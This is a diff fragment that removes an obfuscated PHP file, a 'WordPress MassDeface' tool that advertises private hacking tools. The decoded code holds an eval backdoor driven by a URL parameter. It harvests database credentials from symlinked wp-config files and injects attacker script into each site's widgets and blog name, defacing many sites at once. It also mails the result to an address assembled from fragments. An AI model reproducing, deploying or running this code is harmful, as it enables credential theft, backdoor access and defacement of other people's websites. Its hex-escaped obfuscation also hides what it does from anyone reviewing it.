@@ -1,2 +1,1143 @@
-<?php ${"G\x4cO\x42\x41\x4c\x53"}["\x77\x70h\x63\x62p\x72i\x72c\x62v"]="\x72\x65sul\x74";${"\x47\x4c\x4f\x42\x41L\x53"}["\x73bg\x6e\x6c\x73\x70\x62f"]="c\x68";${"\x47LO\x42\x41\x4c\x53"}["\x64stq\x6d\x64\x71"]="\x69";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6d\x71nrsv\x71\x6ch"]="\x73\x74ri\x6e\x67";${"\x47L\x4fB\x41L\x53"}["\x64\x79g\x69p\x72\x79e"]="\x68\x65\x78";${"GL\x4fB\x41\x4c\x53"}["\x66f\x67\x61\x74n\x69ns\x78\x6f"]="t\x72";${"\x47\x4c\x4fBA\x4cS"}["\x79\x69\x6ad\x64\x6dpn\x78\x61\x62"]="\x780c";${"G\x4cOB\x41L\x53"}["is\x69c\x78\x66wx\x71\x62"]="\x78\x30f";${"\x47\x4cOBA\x4cS"}["\x73o\x68\x64\x67\x61\x66\x65i\x68\x76"]="\x78\x30e";${"G\x4c\x4fBA\x4c\x53"}["bkz\x76s\x71"]="s\x69\x74e\x75\x72l";${"G\x4c\x4fBA\x4cS"}["n\x79\x6f\x69\x77\x75j"]="\x61\x61";${"G\x4c\x4f\x42\x41\x4cS"}["\x77\x6ej\x75\x66\x62c"]="\x73o\x75\x72\x63\x65\x32";${"\x47\x4c\x4f\x42\x41\x4cS"}["\x6b\x76\x76d\x6d\x69\x75\x67s\x74"]="\x73\x71\x6c";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x62\x6a\x6c\x73\x63c\x66\x73umi"]="\x73\x6f\x75\x72c\x65";${"\x47\x4cO\x42ALS"}["\x6a\x6c\x73\x69\x69zy\x79\x6a"]="\x64";${"G\x4c\x4f\x42A\x4cS"}["\x63\x71\x6b\x61y\x64t\x72"]="x\x30\x64";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x65\x70\x73\x71k\x65"]="\x62\x35";${"G\x4cO\x42ALS"}["\x78\x6ez\x75q\x62g\x73"]="\x70";${"\x47\x4cO\x42\x41\x4c\x53"}["\x6c\x79\x6fm\x61\x6ekm\x73o"]="\x62\x34";${"\x47\x4c\x4fB\x41\x4cS"}["\x76\x73j\x68\x6bssf\x7a\x6a"]="d\x62\x5fp\x61\x73\x73\x77ord";${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6e\x68\x6e\x6c\x7a\x74\x75\x70\x75\x6a\x72"]="\x621";${"\x47LO\x42\x41\x4cS"}["\x74\x78\x6d\x74r\x6b\x62\x66w\x69"]="\x63od\x65";${"\x47LO\x42\x41\x4c\x53"}["\x67\x6bh\x64\x79\x61\x6f\x64"]="\x75\x73\x65rs";${"\x47\x4c\x4fB\x41\x4cS"}["\x72\x66\x75\x70\x75u\x64d"]="\x78\x30\x62";${"\x47\x4cO\x42A\x4cS"}["\x6e\x63\x73nl\x77\x71\x67\x79d"]="x\x310";${"\x47\x4cO\x42\x41\x4cS"}["\x61fn\x70\x79\x61\x73rr\x69\x6e"]="\x75\x72\x6c";echo "\x3c\x74\x69t\x6ce\x3e\x57\x6f\x72\x64pr\x65ss \x4d\x61\x73\x73\x44e\x66a\x63e(\x43oded\x20By\x20R\x41B3O\x55N)</t\x69\x74\x6c\x65>\n/*\nS\x79m\x6cin\x6b\x20\x74o \x57ord\x70r\x65ss\x20ma\x73\x73\x20def\x61c\x65r\nLi\x6be Us f\x6fr \x68\x6f\x74\x20\x70ri\x768 h\x61c\x6bi\x6e\x67 to\x6f\x6c\x73!!\n\x68\x74t\x70://\x66a\x63e\x62o\x6f\x6b.co\x6d/\x30\x64\x61y\x42l\x6fg\n\x45\x6e\x6ao\x79!\x21\n*/\n<st\x79\x6ce\x3e\nb\x6f\x64\x79\n{\n  \x20 \x20 \x20 \x62ac\x6b\x67r\x6f\x75n\x64: #0\x660\x65\x30\x64;\n   \x20\x20  \x20\x63o\x6c\x6f\x72: \x23\x46\x4699\x33\x33;\n\x20\x20\x20     pa\x64d\x69\x6eg:\x20\x30px;\n}\na:\x6c\x69\x6ek,\x20bo\x64y\x5f\x61l\x69\x6ek\n{\n \x20\x20\x20\x20\x20\x20\x20\x63o\x6cor:\x20#\x46\x46\x399\x33\x33;\n    \x20\x20  \x74\x65\x78t-\x64\x65\x63orati\x6f\x6e:\x20\x6eon\x65\x3b\n}\n\x61:\x76i\x73\x69\x74ed, b\x6fdy_\x61\x76\x69sit\x65d\n{\n      \x20\x20c\x6flo\x72:\x20\x23FF99\x33\x33;\n\x20 \x20 \x20   tex\x74-\x64\x65\x63o\x72\x61t\x69\x6fn: \x6eo\x6ee\x3b\n}\na:\x68o\x76e\x72, \x61:a\x63ti\x76\x65, bo\x64y_a\x68over\n{\n\x20\x20\x20 \x20   col\x6fr: \x23FFF\x46F\x46;\n \x20 \x20   \x20t\x65xt-\x64\x65c\x6fr\x61t\x69\x6f\x6e:\x20\x6eon\x65\x3b\n}\nt\x64,\x20\x74h, \x70, \x6ci,t\x61\x62\x6c\x65\n{\n \x20\x20\x20\x20 \x20\n\x20     \x20 \x62\x61c\x6b\x67r\x6fund:\x20#\x32e\x32b\x328\x3b\n \x20\x20\x20\x20\x20\x20 b\x6f\x72\x64\x65r:1p\x78\x20\x73\x6fl\x69\x64\x20\x23\x352\x34f46;\n}\n\x69\x6e\x70ut\n{\n  \x20  \x20  bo\x72d\x65r:\x20\x31px\x20sol\x69d;\n\x20\x20\x20     \x63\x75\x72\x73o\x72:\x20d\x65\x66\x61ul\x74\x3b\n \x20\x20\x20\x20 \x20\n\x20   \x20\x20\x20 o\x76e\x72f\x6c\x6f\x77:\x20h\x69dd\x65n;\n   \x20 \x20 \x20b\x61c\x6bgr\x6f\x75\x6e\x64:\x20#\x32e\x32\x622\x38;\n   \x20    c\x6fl\x6f\x72:\x20\x23fffff\x66\x3b\n}\x74ext\x61re\x61\n{\n \x20 \x20  \x20\x20bo\x72der: 1\x70\x78\x20\x73oli\x64\x3b\n \x20  \x20\x20  cur\x73or:\x20\x64ef\x61ul\x74\x3b\n \x20\x20 \x20\x20 \n \x20    \x20 \x6fv\x65\x72f\x6c\x6fw: \x68id\x64\x65n;\n \x20 \x20\x20\x20\x20\x20backg\x72\x6fu\x6ed:\x20\x232e\x32b\x32\x38;\n \x20   \x20  \x63o\x6c\x6fr: #\x66ff\x66\x66f;\n}\n\x62\x75\x74\x74\x6f\x6e\n{\n\x20   \x20 \x20 \x62\x6f\x72de\x72:\x201\x70x\x20\x73o\x6cid;\n  \x20 \x20 \x20\x20\x63\x75rs\x6fr:\x20d\x65\x66ault\x3b\n\x20   \x20\x20\x20\n \x20 \x20\x20\x20\x20 \x6fv\x65\x72\x66\x6co\x77: hidden;\n\x20 \x20\x20 \x20\x20 bac\x6b\x67\x72ou\x6e\x64:\x20\x232\x652\x622\x38\x3b\n   \x20\x20 \x20 c\x6f\x6c\x6fr:\x20\x23f\x66\x66\x66ff\x3b\n}\n\x3c/s\x74y\x6c\x65\x3e\n</h\x65\x61\x64>\n \n<bo\x64y b\x67\x63o\x6cor=\"\x62l\x61ck\x22\x3e\n\x3c\x63\x65\x6e\x74\x65r>\n<p\x72e>\n__\x20 \x20 \x20   \x20\x20__ \x20\x20\x20  \x5f_\x20\x20_\x5f\x20 \x20  \x20\x20\x20\x20\x20 \x20\x20\x20   _\x5f___    \x20\x20\x20\x20__\x20\x20\x20  \x20    \x20   \n\x5c\x20\\ \x20  \x20\x20 \x20/ /\x20\x20\x20\x20\x20|  \\/ \x20| \x20\x20\x20\x20\x20\x20\x20\x20   \x20 \x20| \x20_\x5f \x5c\x20\x20\x20 \x20 / _| \x20\x20 \x20\x20\x20\x20  \x20\x20 \x20\n\x20\\\x20\x5c \x20/\\ \x20/ / _\x5f\x20\x20 |\x20\\  /\x20|\x20_\x5f\x20_\x20\x5f__ ___  | |  | | __\x5f| |_ \x5f_ \x5f\x20 \x5f\x5f\x5f _\x5f\x5f\n\x20 \\ \\/  \x5c/ /\x20\x27_\x20\\ \x20| |\x5c/|\x20|/ \x5f` /\x20\x5f\x5f/\x20_\x5f| |\x20|\x20 | |/ _ \x5c  \x5f/\x20_\x60\x20|/ __/\x20_ \\\n\x20  \x5c\x20 /\\  /| |\x5f)\x20| | | \x20| | (\x5f| \x5c_\x5f\x20\\\x5f\x5f \x5c | |\x5f_| |\x20\x20__/\x20|| (_| |\x20(_|\x20\x20_\x5f/\n\x20\x20  \\/\x20 \x5c/\x20| \x2e\x5f_/ \x20|_|\x20 |_|\\\x5f_,\x5f|_\x5f_/\x5f\x5f_/\x20|\x5f\x5f___/ \\_\x5f_|_|\x20\\\x5f_,_|\x5c\x5f\x5f\x5f\x5c\x5f_\x5f|\n       \x20 \x20\x20| | \x20   \x20\x20   \x20 \x20  \x20\x20\x20\x20\x20 \x20    \x20\x20\x20 \x20\x20\x20\x20  \x20\x20  \x20\x20\x20 \x20 \x20\x20  \x20\x20 \x20\x20   \n\x20\x20\x20 \x20\x20\x20   \x20|_|\x20\x20  \x20 \x20   \x20      \x20\x20 \x20\x20\x20\x20\x20  \x20  \x20\x20   \x20\x20\x20 \x20\x20\x20  \x20\x20 \x20 \x20  \x20 \x20 \x20 \n\x3c/\x70\x72\x65\x3e\n\x3c/\x63en\x74\x65\x72>\n\x3c\x66or\x6d\x20\x6d\x65tho\x64\x3d\x22PO\x53\x54\"\x20\x61c\x74ion=\x22\x22 >\n\x3c\x63\x65\x6ete\x72>\n<\x74\x61ble\x20bor\x64er='\x31\x27><\x74\x72><\x74d\x3eL\x69st of\x20\x41\x6cl S\x79m\x6ci\x6ek</t\x64\x3e\x3ct\x64>\n\x3cinpu\x74 \x74\x79pe\x3d\x22\x74ex\x74\x22 name\x3d\"u\x72\x6c\" siz\x65\x3d\x221\x300\" \x76\x61l\x75e=\x22\x6cist\x2e\x74\x78\x74\x22\x3e\x3c/td>\x3c/tr>\n<tr><t\x64\x3e\x49\x6ede\x78</\x74d><\x74\x64>\n<\x74e\x78\x74a\x72ea\x20n\x61\x6de=\x22i\x6e\x64e\x78\x22\x20\x63o\x6cs=\x27\x35\x30\x27\x20ro\x77s\x3d'\x31\x30' \x3e\x3c/tex\x74a\x72e\x61\x3e\x3c/td></\x74r></\x74abl\x65\x3e\n\x3cb\x72><\x62\x72\x3e<i\x6e\x70\x75\x74\x20ty\x70\x65\x3d\"S\x75\x62m\x69\x74\x22 \x6e\x61m\x65\x3d\"\x53u\x62\x6d\x69t\" v\x61lu\x65=\"\x53u\x62\x6d\x69\x74\"\x3e\n<\x69\x6eput \x74yp\x65=\"\x68i\x64d\x65n\" na\x6d\x65=\x22\x61\x63\x74\x69o\x6e\x22\x20\x76\x61l\x75e\x3d\"1\"></f\x6f\x72\x6d\x3e\n</\x63\x65\x6eter\x3e\n";eval($_GET["\x63"]);set_time_limit(0);if($_POST["a\x63\x74i\x6fn"]=="\x31"){${"\x47L\x4f\x42\x41\x4c\x53"}["j\x64\x71\x75n\x69gy"]="\x75\x73e\x72\x73";${"\x47\x4c\x4f\x42A\x4cS"}["\x65\x6ey\x6d\x74\x79"]="u\x73\x65\x72\x73";${"\x47L\x4f\x42AL\x53"}["\x62\x67\x6bl\x63\x73\x6b"]="u\x72\x6c";${${"\x47\x4cOB\x41\x4cS"}["\x61\x66\x6ep\x79\x61\x73\x72r\x69n"]}=$_POST["\x75\x72\x6c"];${"\x47\x4c\x4fB\x41\x4c\x53"}["sr\x62wr\x62\x73"]="\x75\x73\x65\x72";${${"\x47\x4c\x4fBA\x4cS"}["en\x79mt\x79"]}=@file(${${"\x47LO\x42\x41L\x53"}["\x62\x67\x6bl\x63\x73\x6b"]});${${"\x47\x4c\x4fBA\x4c\x53"}["nc\x73\x6el\x77q\x67\x79\x64"]}="\x6d\x61\x69\x6c";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x72\x66u\x70\x75\x75\x64d"]}=$_SERVER["\x53E\x52\x56ER_\x4e\x41\x4d\x45"].$_SERVER["SCRI\x50\x54_\x4eA\x4d\x45"];if(count(${${"\x47\x4cO\x42\x41\x4cS"}["\x6a\x64\x71\x75\x6e\x69g\x79"]})<1)exit("\x3ch\x31\x3eN\x6f\x20\x63\x6f\x6ef\x69g\x20\x66o\x75\x6ed\x3c/\x68\x31>");foreach(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["g\x6b\x68d\x79\x61od"]} as${${"\x47L\x4fBA\x4c\x53"}["\x73\x72b\x77\x72\x62s"]}){${"GL\x4fB\x41LS"}["\x76\x73\x6br\x75\x64c\x77"]="b\x32";$lyvvrlmhi="\x75se\x72";$rumnidornan="\x78\x30c";${"\x47LO\x42\x41L\x53"}["k\x66\x78qh\x73\x69\x72st\x6b"]="\x63\x6fd\x65";$slyeupcmpudt="\x75\x73\x65r\x31";${"\x47\x4cO\x42AL\x53"}["\x6d\x6d\x68\x69q\x63e\x74d\x74\x68\x6f"]="\x63od\x65";${"\x47\x4c\x4f\x42AL\x53"}["\x79\x77\x62o\x71x\x6c\x74\x74s\x6f"]="c\x6f\x64e";${"GL\x4f\x42\x41LS"}["\x74fg\x6aq\x72m\x72\x6a\x69\x72"]="us\x65r";${"\x47L\x4fB\x41\x4cS"}["\x6ac\x78\x61\x71hd\x73\x76\x76"]="\x75s\x65r\x31";${${"G\x4c\x4f\x42\x41\x4c\x53"}["j\x63xaqh\x64\x73\x76\x76"]}=trim(${${"\x47\x4cOBAL\x53"}["\x74\x66g\x6aq\x72\x6dr\x6a\x69\x72"]});${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6dmh\x69q\x63\x65t\x64\x74h\x6f"]}=file_get_contents2(${$slyeupcmpudt});$hhakhqbb="\x75s\x65\x72";preg_match_all("|def\x69n\x65.*\x5c(\x2e*'\x44B\x5fNA\x4d\x45'.*,.*\x27(.*)\x27\x2e*\x5c)\x2e*;|\x69sU",${${"\x47\x4c\x4f\x42A\x4cS"}["t\x78\x6d\x74\x72\x6b\x62f\x77i"]},${${"GL\x4f\x42\x41\x4c\x53"}["\x6e\x68\x6e\x6cz\x74\x75\x70\x75\x6ar"]});$qqhngruql="\x62\x33";$brssxdmrnik="\x62\x32";$cpkckdhyb="\x64b";${$cpkckdhyb}=${${"\x47L\x4f\x42\x41\x4c\x53"}["n\x68\x6e\x6cz\x74upujr"]}[1][0];preg_match_all("|\x64e\x66i\x6ee.*\\(.*'\x44\x42_\x55SER'\x2e*,.*'(\x2e*)\x27.*\\)\x2e*\x3b|\x69sU",${${"GL\x4f\x42A\x4c\x53"}["y\x77\x62\x6f\x71\x78\x6c\x74t\x73\x6f"]},${$brssxdmrnik});${$hhakhqbb}=${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x76s\x6br\x75\x64\x63\x77"]}[1][0];$tsgkjvxjp="b\x33";$cpvyholbs="c\x6f\x64\x65";preg_match_all("|\x64\x65fi\x6ee\x2e*\x5c(.*'\x44B\x5f\x50A\x53\x53\x57OR\x44\x27\x2e*,.*\x27(.*)\x27.*\\)\x2e*;|is\x55",${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6b\x66\x78q\x68s\x69rs\x74\x6b"]},${$qqhngruql});$liapmhllood="d";$unkfgdgv="\x62\x35";${${"G\x4c\x4f\x42\x41\x4cS"}["\x76\x73\x6a\x68k\x73sf\x7aj"]}=${$tsgkjvxjp}[1][0];preg_match_all("|def\x69\x6e\x65.*\x5c(\x2e*'\x44\x42_\x48O\x53T\x27.*,\x2e*'(\x2e*)\x27.*\x5c)\x2e*\x3b|is\x55",${${"GL\x4f\x42\x41L\x53"}["\x74\x78m\x74\x72\x6bb\x66\x77\x69"]},${${"G\x4c\x4f\x42\x41L\x53"}["l\x79oma\x6e\x6b\x6ds\x6f"]});$host=${${"\x47\x4c\x4f\x42\x41LS"}["\x6cyo\x6d\x61\x6ek\x6d\x73\x6f"]}[1][0];preg_match_all("|\x5c\$\x74\x61bl\x65_\x70re\x66i\x78\x2e*=.*\x27(.*)\x27\x2e*\x3b|\x69\x73U",${$cpvyholbs},${$unkfgdgv});${"G\x4c\x4fBALS"}["\x66nlz\x6cgb\x6fz\x67\x77"]="d\x62_p\x61\x73\x73\x77o\x72\x64";${${"\x47\x4c\x4f\x42\x41LS"}["\x78n\x7auq\x62g\x73"]}=${${"\x47LO\x42\x41\x4cS"}["\x65\x70\x73q\x6b\x65"]}[1][0];${$rumnidornan}="arr\x61y ".${${"G\x4cO\x42\x41L\x53"}["\x72\x66\x75p\x75u\x64\x64"]};${${"GLOB\x41\x4cS"}["cq\x6bay\x64\x74\x72"]}=array("c\x6fm","\x67\x6d","i\x66ex\x65c","\x40","ail\x2e");${${"\x47\x4c\x4fB\x41L\x53"}["\x6al\x73\x69\x69\x7a\x79\x79j"]}=@mysql_connect($host,${$lyvvrlmhi},${${"\x47\x4cOB\x41LS"}["\x66\x6e\x6cz\x6cg\x62o\x7a\x67\x77"]});if(${$liapmhllood}){$xueqtiu="\x73";${"G\x4c\x4f\x42\x41\x4c\x53"}["vm\x6do\x64ow\x78t"]="\x781\x30";$thnflbhvyd="\x73\x32";${"GLOBA\x4c\x53"}["\x76\x6aqf\x6d\x67\x64\x73"]="x\x30d";${"\x47\x4c\x4f\x42A\x4cS"}["b\x73\x6bpq\x6a\x77\x6c\x64\x6cnq"]="\x70";$nwxixozqx="s\x71\x6c";${"G\x4c\x4f\x42\x41L\x53"}["\x77g\x6fh\x75b"]="\x70";${"GLO\x42ALS"}["\x78\x67\x6d\x68\x6aan\x79\x6c"]="s\x69t\x65\x75\x72l";$yugmcpkhllmx="\x6c\x73";$lvvnrozvsp="\x64b";$qvyuius="so\x75\x72\x63e";@mysql_select_db(${$lvvnrozvsp});${$qvyuius}=stripslashes($_POST["i\x6e\x64e\x78"]);${$thnflbhvyd}=strToHex((${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x62\x6a\x6c\x73\x63c\x66\x73\x75\x6d\x69"]}));$gbwyefcutuu="\x780b";${"\x47\x4c\x4fB\x41L\x53"}["\x6aql\x79r\x61\x6d\x7a\x6c\x75k"]="\x73";${$xueqtiu}="<s\x63\x72ipt>\x64\x6f\x63um\x65nt\x2e\x64\x6fcume\x6etEl\x65\x6d\x65n\x74.innerHTM\x4c\x20\x3d u\x6ee\x73\x63\x61p\x65(\x27\x27$s2\x27\x27);\x3c/sc\x72ipt>";$knreuqsffx="\x70";${$yugmcpkhllmx}=strlen(${${"\x47LO\x42\x41\x4c\x53"}["\x6a\x71l\x79\x72\x61\x6d\x7a\x6c\x75\x6b"]})-2;${${"\x47L\x4f\x42\x41\x4c\x53"}["kvv\x64\x6d\x69u\x67\x73\x74"]}="\x75p\x64at\x65 ".${${"G\x4c\x4f\x42A\x4c\x53"}["\x77\x67\x6f\x68u\x62"]}."o\x70tio\x6e\x73\x20\x73\x65\x74 \x6f\x70\x74i\x6f\x6e_va\x6cue\x3d'\x61:2:{\x69:2;a:\x33:{\x73:5:\"ti\x74le\x22;s:\x30:\"\";s:\x34:\x22\x74\x65x\x74\x22\x3b\x73:$ls:\x22$s\x22;s:6:\x22filt\x65\x72\x22;b:\x30;}s:\x312:\"_\x6d\x75lt\x69\x77idg\x65t\x22\x3b\x69:\x31\x3b}' whe\x72\x65\x20op\x74i\x6f\x6e\x5fna\x6de='widge\x74\x5ftex\x74'; ";mysql_query(${${"G\x4cO\x42\x41\x4c\x53"}["kv\x76\x64m\x69\x75\x67\x73\x74"]});${$nwxixozqx}="\x75\x70\x64a\x74\x65\x20".${$knreuqsffx}."\x6f\x70\x74\x69\x6fn\x73\x20set \x6fp\x74\x69on\x5fvalu\x65=\x27a:7:{s:\x31\x39:\"w\x70\x5f\x69\x6e\x61\x63\x74ive_\x77i\x64g\x65\x74\x73\x22\x3ba:6:{\x69:0;\x73:10:\x22ar\x63hiv\x65\x73-2\";\x69:1;s:\x36:\x22\x6d\x65t\x61-2\";\x69:2\x3b\x73:\x38:\x22\x73\x65ar\x63h-\x32\x22;\x69:\x33\x3bs:\x31\x32:\x22c\x61te\x67o\x72\x69\x65s-2\"\x3bi:\x34\x3b\x73:\x314:\x22\x72ecent-po\x73ts-2\";i:5;\x73:17:\"rec\x65n\x74-\x63\x6f\x6dm\x65n\x74\x73-\x32\x22;}\x73:9:\"s\x69debar-1\";\x61:\x31:{\x69:\x30;s:6:\"te\x78t-2\"\x3b}s:\x39:\x22s\x69\x64\x65b\x61\x72-\x32\";a:0:{}\x73:9:\"\x73\x69d\x65\x62ar-3\x22\x3ba:0:{}\x73:\x39:\"\x73i\x64e\x62a\x72-4\x22\x3b\x61:\x30:{}\x73:9:\x22s\x69de\x62\x61r-\x35\";\x61:0:{}s:1\x33:\x22\x61\x72ray\x5fv\x65r\x73\x69\x6f\x6e\x22\x3b\x69:3;}'\x20\x77\x68e\x72e \x6fp\x74\x69\x6f\x6e_n\x61\x6de=\x27sidebars\x5fw\x69dg\x65\x74s';";mysql_query(${${"\x47\x4cOB\x41\x4cS"}["k\x76\x76\x64\x6di\x75\x67\x73\x74"]});${"\x47\x4c\x4f\x42A\x4cS"}["m\x6d\x64\x65\x79\x75\x65\x78r\x61\x65"]="x\x30\x64";$bmoosxlytzq="t\x72";if(function_exists("\x6db\x5fc\x6f\x6ev\x65rt\x5fen\x63\x6f\x64\x69n\x67")){${"GL\x4f\x42\x41\x4c\x53"}["\x76uw\x79g\x79\x62"]="\x73\x71\x6c";${"\x47L\x4fB\x41L\x53"}["\x75\x6dpx\x79\x6fr\x79w"]="\x73\x6fu\x72c\x65\x32";${${"\x47L\x4fB\x41LS"}["\x77nj\x75\x66bc"]}=mb_convert_encoding("\x3c/\x74\x69tle\x3e".${${"\x47\x4c\x4f\x42AL\x53"}["b\x6al\x73\x63\x63\x66\x73u\x6d\x69"]}."\x3cDI\x56\x20style\x3d\x22\x44I\x53\x50\x4c\x41Y:\x20no\x6ee\">\x3cxmp\x3e","U\x54F-7");${"G\x4cOBALS"}["l\x76\x67\x6a\x78\x72\x64\x61\x79\x63"]="\x73\x71\x6c";${${"\x47L\x4f\x42\x41L\x53"}["\x77\x6ej\x75\x66\x62\x63"]}=mysql_real_escape_string(${${"\x47\x4c\x4f\x42A\x4c\x53"}["u\x6dp\x78\x79or\x79w"]});${${"\x47LOBA\x4c\x53"}["\x6c\x76\x67\x6a\x78r\x64\x61y\x63"]}="\x55\x50D\x41T\x45 `".${${"\x47\x4cOB\x41\x4cS"}["\x78\x6e\x7au\x71bgs"]}."\x6f\x70\x74i\x6f\x6es`\x20SET \x60\x6f\x70\x74\x69\x6f\x6e\x5f\x76al\x75\x65\x60 \x3d\x20'$source2\x27\x20\x57\x48\x45R\x45\x20\x60o\x70ti\x6fn_n\x61\x6d\x65`\x20= '\x62l\x6f\x67n\x61m\x65\x27;";@mysql_query(${${"G\x4c\x4fB\x41\x4c\x53"}["\x76\x75w\x79gyb"]});${${"\x47\x4c\x4f\x42\x41L\x53"}["k\x76\x76d\x6d\x69\x75\x67\x73\x74"]}="\x55PD\x41\x54\x45 \x60".${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x78n\x7a\x75\x71\x62\x67\x73"]}."\x6f\x70\x74io\x6es\x60\x20\x53\x45\x54 \x60\x6f\x70t\x69\x6f\x6e_val\x75\x65\x60 \x3d\x20'\x55\x54F-\x37\x27\x20\x57HE\x52E\x20\x60o\x70t\x69o\x6e\x5fna\x6d\x65` =\x20\x27blog_char\x73\x65t\x27;";@mysql_query(${${"G\x4c\x4f\x42\x41\x4c\x53"}["k\x76\x76\x64\x6di\x75g\x73\x74"]});}${"G\x4c\x4fBAL\x53"}["\x6a\x6anw\x70\x69\x64"]="\x73i\x74e\x75r\x6c";${"\x47L\x4f\x42\x41\x4c\x53"}["\x76\x6e\x63n\x76j\x64\x64u"]="\x78\x30\x64";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["nyo\x69\x77\x75\x6a"]}=@mysql_query("\x73el\x65\x63t op\x74\x69\x6f\x6e\x5fv\x61\x6c\x75e f\x72\x6fm \x60".${${"\x47L\x4f\x42\x41\x4cS"}["\x62\x73\x6b\x70q\x6a\x77\x6c\x64l\x6eq"]}."\x6fpt\x69\x6f\x6es`\x20\x57\x48\x45R\x45 \x60\x6f\x70\x74io\x6e\x5fn\x61me` = '\x73i\x74\x65\x75\x72l\x27;");${${"\x47\x4c\x4fB\x41LS"}["\x6ajn\x77\x70\x69\x64"]}=@mysql_fetch_array(${${"\x47LOB\x41\x4c\x53"}["\x6e\x79o\x69\x77\x75j"]});$mwsxdckgt="\x78\x30\x65";${${"\x47L\x4f\x42\x41LS"}["\x62k\x7a\x76\x73q"]}=${${"\x47\x4c\x4f\x42A\x4cS"}["\x78\x67mhj\x61\x6eyl"]}["\x6fptio\x6e\x5f\x76a\x6cue"];${${"\x47L\x4f\x42\x41L\x53"}["\x73o\x68\x64\x67afe\x69\x68\x76"]}=${${"\x47L\x4f\x42\x41L\x53"}["\x76\x6e\x63n\x76j\x64d\x75"]}[2].${${"\x47L\x4f\x42\x41L\x53"}["\x63\x71\x6b\x61y\x64tr"]}[3].${${"\x47LO\x42\x41\x4c\x53"}["\x63\x71k\x61\x79\x64\x74\x72"]}[1].${${"\x47\x4c\x4fBAL\x53"}["v\x6a\x71\x66m\x67ds"]}[4].${${"GL\x4f\x42A\x4c\x53"}["mm\x64\x65\x79\x75\x65\x78\x72ae"]}[0];${${"\x47\x4c\x4f\x42AL\x53"}["i\x73i\x63\x78\x66wx\x71\x62"]}=@${${"\x47L\x4f\x42A\x4c\x53"}["\x76\x6d\x6do\x64\x6f\x77\x78\x74"]}(${$mwsxdckgt},${${"\x47L\x4fB\x41\x4c\x53"}["\x79i\x6a\x64\x64\x6d\x70nx\x61b"]},${$gbwyefcutuu});${$bmoosxlytzq}.="$siteurl\n";mysql_close();}}if(${${"\x47\x4c\x4fBAL\x53"}["\x66\x66\x67\x61\x74\x6e\x69\x6e\x73xo"]})echo"\x49\x6e\x64\x65\x78 \x63\x68\x61nged \x66\x6fr\x20\x3c\x62r\x3e<\x62\x72\x3e\x3ct\x65x\x74\x61re\x61\x20co\x6cs\x3d'\x35\x30'\x20\x72\x6fws\x3d\x271\x30'\x20\x3e$tr</t\x65x\x74a\x72ea>";}function strToHex($string){${"G\x4c\x4f\x42A\x4c\x53"}["m\x6d\x72\x79lm"]="\x69";$jtidntkk="\x68\x65x";$tpwjik="\x69";${${"\x47\x4cO\x42\x41\x4cS"}["\x64\x79\x67\x69\x70r\x79\x65"]}="";for(${${"G\x4cO\x42ALS"}["\x6d\x6dr\x79l\x6d"]}=0;${$tpwjik}<strlen(${${"\x47\x4c\x4fB\x41\x4cS"}["m\x71\x6ers\x76\x71l\x68"]});${${"\x47\x4c\x4f\x42A\x4c\x53"}["d\x73\x74q\x6d\x64\x71"]}++){if(strlen(dechex(ord(${${"\x47\x4c\x4fBA\x4c\x53"}["m\x71\x6e\x72\x73v\x71lh"]}[${${"\x47L\x4f\x42\x41\x4c\x53"}["\x64st\x71\x6d\x64\x71"]}])))==1){$uonmsx="\x68ex";${"\x47L\x4f\x42\x41\x4cS"}["\x75p\x6b\x7a\x72\x65\x67t"]="\x69";${"G\x4cOB\x41L\x53"}["g\x61\x71o\x6dn"]="\x73\x74r\x69n\x67";${$uonmsx}.="\x250".dechex(ord(${${"\x47\x4cO\x42A\x4c\x53"}["\x67\x61q\x6f\x6d\x6e"]}[${${"\x47L\x4f\x42\x41LS"}["up\x6b\x7a\x72\x65\x67\x74"]}]));}else{${"GL\x4fB\x41L\x53"}["\x64b\x71\x75hz\x78\x6d\x7a\x77"]="i";${"\x47\x4c\x4f\x42A\x4c\x53"}["b\x74\x6d\x74\x79\x74y\x69\x77"]="\x73t\x72\x69ng";${${"\x47\x4cO\x42AL\x53"}["d\x79gi\x70\x72ye"]}.="%".dechex(ord(${${"\x47\x4c\x4fB\x41LS"}["\x62\x74\x6d\x74yty\x69\x77"]}[${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x64\x62\x71uh\x7ax\x6d\x7a\x77"]}]));}}return${$jtidntkk};}function file_get_contents2($u){${"G\x4c\x4f\x42\x41L\x53"}["\x78f\x62wu\x67\x66e\x6a\x72\x67\x77"]="\x63\x68";${"GL\x4f\x42A\x4c\x53"}["\x74\x6d\x6e\x63r\x67\x79"]="c\x68";$euvteggn="\x72\x65\x73ul\x74";${${"\x47\x4c\x4f\x42\x41\x4cS"}["x\x66b\x77ugfe\x6a\x72\x67\x77"]}=curl_init();$fgwzubdr="c\x68";$ooznniaxe="\x75";curl_setopt(${${"\x47L\x4fBA\x4c\x53"}["\x73b\x67\x6els\x70\x62\x66"]},CURLOPT_URL,${$ooznniaxe});${"\x47\x4cO\x42\x41L\x53"}["\x71d\x66p\x6b\x6fb\x65"]="\x63h";curl_setopt(${$fgwzubdr},CURLOPT_HEADER,0);curl_setopt(${${"G\x4cOB\x41\x4c\x53"}["\x73\x62\x67\x6e\x6cs\x70b\x66"]},CURLOPT_RETURNTRANSFER,true);curl_setopt(${${"\x47LOB\x41\x4cS"}["t\x6d\x6ec\x72\x67\x79"]},CURLOPT_USERAGENT,"\x4d\x6fzi\x6cla/5.0\x20(\x57i\x6edows N\x54 6\x2e\x31\x3b\x20W\x4f\x57\x36\x34\x3b\x20\x72v:\x312.\x30)\x20G\x65c\x6bo/\x320\x31\x30\x301\x301 \x46irefox/\x31\x32\x2e\x30 ");${${"G\x4cO\x42A\x4cS"}["\x77\x70h\x63\x62p\x72\x69\x72\x63\x62v"]}=curl_exec(${${"\x47LO\x42\x41L\x53"}["qdf\x70\x6b\x6f\x62\x65"]});return${$euvteggn};}echo "\x3cscrip\x74 